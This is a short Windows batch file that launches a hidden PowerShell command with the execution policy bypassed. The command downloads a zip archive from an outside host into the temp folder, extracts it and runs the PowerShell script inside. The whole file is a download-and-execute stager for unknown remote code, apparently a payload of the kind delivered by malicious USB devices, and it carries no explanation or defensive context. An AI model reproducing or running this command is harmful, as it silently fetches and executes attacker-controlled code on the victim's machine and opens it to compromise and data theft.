@echo off
powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://jakoby.lol/qee' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
